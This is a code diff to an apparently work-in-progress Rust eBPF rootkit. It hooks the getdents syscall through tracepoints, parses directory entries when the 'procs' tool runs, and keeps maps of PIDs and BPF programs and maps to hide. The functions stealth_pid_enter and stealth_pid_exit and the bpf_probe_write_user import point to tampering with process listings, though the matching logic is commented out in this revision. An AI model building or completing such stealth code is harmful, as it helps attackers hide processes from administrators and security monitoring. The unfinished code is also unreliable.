@@ -1,19 +1,20 @@
 #![no_std]
 #![no_main]
+use core::str;
 
 use aya_ebpf::{
     bindings::{bpf_attr, bpf_cmd},
     cty::c_void,
     helpers::{
         bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read,
+        bpf_probe_read_kernel, bpf_probe_read_kernel_buf, bpf_probe_read_kernel_str_bytes,
         bpf_probe_write_user,
     },
     macros::{map, tracepoint},
-    maps::HashMap,
+    maps::{Array, HashMap, Queue},
     programs::TracePointContext,
 };
 use aya_log_ebpf::{debug, error, info};
-
 #[map]
 static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
 #[map]
@@ -21,12 +22,20 @@ static MAP_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0
 #[map]
 static HIDDEN_BPF_OBJ: HashMap<u32, [u32; 32]> = HashMap::<u32, [u32; 32]>::with_max_entries(2, 0);
 
-#[no_mangle]
-pub static HIDDEN_PID: u32 = 0;
+#[map]
+static HIDDEN_PIDS: Array<HiddenPid> = Array::with_max_entries(32, 0);
 #[map]
 static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(32, 0);
+#[map]
+static PARSED: Queue<QueuedDirent> = Queue::with_max_entries(8192, 0);
 
-const MAX_DIRENTS: u32 = 500u32;
+const MAX_DIRENTS: u32 = 500u32; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise
+const MAX_PID_LENGTH: usize = 10; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise
+
+struct HiddenPid {
+    bytes: [u8; MAX_PID_LENGTH],
+    len: usize,
+}
 
 enum BpfObjType {
     Prog,
@@ -105,44 +114,24 @@ pub fn stealth_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
 }
 
 #[repr(C)]
-#[derive(Default)]
-pub struct __IncompleteArrayField<T>(::core::marker::PhantomData<T>, [T; 0]);
-impl<T> __IncompleteArrayField<T> {
-    #[inline]
-    pub const fn new() -> Self {
-        __IncompleteArrayField(::core::marker::PhantomData, [])
-    }
-    #[inline]
-    pub fn as_ptr(&self) -> *const T {
-        self as *const _ as *const T
-    }
-    #[inline]
-    pub fn as_mut_ptr(&mut self) -> *mut T {
-        self as *mut _ as *mut T
-    }
-    #[inline]
-    pub unsafe fn as_slice(&self, len: usize) -> &[T] {
-        ::core::slice::from_raw_parts(self.as_ptr(), len)
-    }
-    #[inline]
-    pub unsafe fn as_mut_slice(&mut self, len: usize) -> &mut [T] {
-        ::core::slice::from_raw_parts_mut(self.as_mut_ptr(), len)
-    }
-}
-impl<T> ::core::fmt::Debug for __IncompleteArrayField<T> {
-    fn fmt(&self, fmt: &mut ::core::fmt::Formatter<'_>) -> ::core::fmt::Result {
-        fmt.write_str("__IncompleteArrayField")
-    }
-}
-
-#[repr(C)]
 #[derive(Debug)]
 pub struct LinuxDirent64 {
     pub d_ino: ::aya_ebpf::cty::c_ulonglong,
     pub d_off: ::aya_ebpf::cty::c_longlong,
     pub d_reclen: ::aya_ebpf::cty::c_ushort,
     pub d_type: ::aya_ebpf::cty::c_uchar,
-    pub d_name: __IncompleteArrayField<::aya_ebpf::cty::c_char>,
+    pub d_name: [u8; 0],
+}
+
+#[repr(C)]
+#[derive(Debug)]
+pub struct QueuedDirent {
+    pub idx: u32,
+    pub bpos: u64,
+
+    pub d_reclen: ::aya_ebpf::cty::c_ushort,
+    pub d_type: ::aya_ebpf::cty::c_uchar,
+    pub d_name: [u8; 10],
 }
 
 #[repr(C)]
@@ -155,84 +144,138 @@ struct DirentData<'a> {
     d_reclen_prev: u32,
 }
 
+fn str_eq(a: &HiddenPid, b: &[u8]) -> bool {
+    if a.len != b.len() {
+        return false;
+    }
+
+    for i in 0..b.len() {
+        if a.bytes[i] != b[i] {
+            return false;
+        }
+    }
+    true
+}
 #[inline]
 fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
     if idx >= MAX_DIRENTS {
-        info!((*ctx).ctx, "{}>{}", idx, MAX_DIRENTS);
+        info!(ctx.ctx, "{}>{}", idx, MAX_DIRENTS);
+        return 1;
+    }
+    if ctx.bpos >= ctx.max_offset {
+        info!(ctx.ctx, "({}) maxoffset {} exceeded", idx, ctx.max_offset);
         return 1;
     }
 
     if let Ok(dirent) = unsafe {
         bpf_probe_read((ctx.dirents_buf_addr + ctx.bpos) as *const LinuxDirent64).map_err(|_| 1u32)
     } {
-        if let Ok(cmd) = bpf_get_current_comm().map_err(|_| 1u32) {
-            if cmd[..5] == [112, 114, 111, 99, 115] {
-                info!((*ctx).ctx, "{} @ {}", idx, ctx.bpos);
-            } else {
-                return 1;
-            }
+        let len = dirent.d_reclen as u64;
+        ctx.bpos += len;
+        let mut buf = [0u8; 12];
+        let parsed_pid = unsafe {
+            bpf_probe_read_kernel_str_bytes(dirent.d_name.as_ptr() as *const u8, &mut buf)
+        };
+
+        let parsed_pid = parsed_pid.unwrap();
+        // let parsed_pid = {
+        //     let dname_size = (ctx.d_reclen as usize).saturating_sub(19);
+        //     unsafe { core::slice::from_raw_parts(dirent.d_name.as_ptr() as *const u8, 10) }
+        // };
+        let mut buff = [0u8; 10];
+        for (idx, c) in parsed_pid.iter().enumerate() {
+            buff[idx] = *c
         }
 
-        ctx.bpos += dirent.d_reclen as u64;
+        PARSED
+            .push(
+                &QueuedDirent {
+                    idx,
+                    bpos: ctx.bpos,
+                    d_reclen: dirent.d_reclen,
+                    d_type: dirent.d_type,
+                    d_name: buff,
+                },
+                0,
+            )
+            .unwrap();
 
-        let hidden_pid_bytes = unsafe { core::ptr::read_volatile(&HIDDEN_PID) }.to_be_bytes();
+        // match parsed_pid {
+        //     Ok(parsed_pid) => {
+        //         let mut buff = [0u8; 10];
+        //         for (idx, c) in parsed_pid.iter().enumerate() {
+        //             buff[idx] = *c
+        //         }
 
-        let dname_slice = unsafe { dirent.d_name.as_slice(10) };
+        //         PARSED
+        //             .push(
+        //                 &QueuedDirent {
+        //                     d_ino: dirent.d_ino,
+        //                     d_off: dirent.d_off,
+        //                     d_reclen: dirent.d_reclen,
+        //                     d_type: dirent.d_type,
+        //                     d_name: buff,
+        //                 },
+        //                 0,
+        //             )
+        //             .unwrap();
+        //         //parsed_pid_str = unsafe { core::str::from_utf8_unchecked(parsed_pid) };
+        //         // info!(
+        //         //     ctx.ctx,
+        //         //     "({}) bpos: {} pid: {}", idx, ctx.bpos, parsed_pid_str
+        //         // );
+        //     }
+        //     _ => {
+        //         info!(ctx.ctx, "error in parsing");
+        //         return 0;
+        //     }
+        // };
 
-        for (a, b) in dname_slice.into_iter().zip(hidden_pid_bytes) {
-            if *a as u8 != b {
-                break;
-            }
-            let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
-            info!((*ctx).ctx, "{}: FOUND IT!", caller_pid);
-        }
+        // if dirent.d_type == 4u8 || true {
+        //     for i in 0..32 {
+        //         match HIDDEN_PIDS.get(i) {
+        //             Some(hidden_pid) => {
+        //                 if str_eq(hidden_pid, parsed_pid_str.as_bytes()) {
+        //                     info!(ctx.ctx, "FOUND IT!!");
+        //                 }
+        //                 break;
+        //             }
+        //             _ => {}
+        //         }
+        //     }
+        // };
     } else {
-        info!((*ctx).ctx, "iter {} not found:(", idx);
-        return 1;
-    }
-
-    if ctx.bpos >= ctx.max_offset {
-        info!((*ctx).ctx, "maxoffset {} exceeded", ctx.max_offset);
+        info!(ctx.ctx, "dirent entry {} not found:(", idx);
         return 1;
     }
 
     0
 }
-//    if(is_end_of_buff(data->bpos, data->buff_size)) return 1;
 
-//    u8 dirname[MAX_NAME_LEN];
-//    struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);
-
-//    read_user__reclen(&data->d_reclen, &dirent->d_reclen);
-//    read_user__dirname(dirname, dirent->d_name);
-
-//    struct userspace_data * userspace_data = data->userspace_data;
-
-//    int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);
-
-//    if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
-//       data->patch_succeded = remove_curr_dirent(data);
-//       return 1;
-//    }
-
-//    data->d_reclen_prev = data->d_reclen;
-//    data->bpos += data->d_reclen;
 #[tracepoint]
 pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
-    debug!(&ctx, "sys_exit");
-
+    if let Ok(cmd) = bpf_get_current_comm().map_err(|_| 1u32) {
+        if cmd[..5] == [112, 114, 111, 99, 115] {
+            info!(&ctx, "procs called");
+        } else {
+            return Ok(0);
+        }
+    }
     let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
+    info!(&ctx, "max offset is: {}", max_offset);
     let dirents_buf_addr = *unsafe { PID_DIRENTS.get(&caller_pid) }.ok_or(1u32)?;
     let mut dirent_data = DirentData {
         ctx: &ctx,
         bpos: 0,
-        max_offset: max_offset,
-        dirents_buf_addr: dirents_buf_addr,
+        max_offset,
+        dirents_buf_addr,
         d_reclen: 0,
         d_reclen_prev: 0,
     };
+
+    info!(&ctx, "start loop @address {}", dirents_buf_addr);
 
     unsafe {
         bpf_loop(
@@ -242,8 +285,9 @@ pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
             0,
         )
     };
-
+    info!(&ctx, "out of loop : {}/{} ", dirent_data.bpos, max_offset,);
     PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;
+
     Ok(0)
 }
 
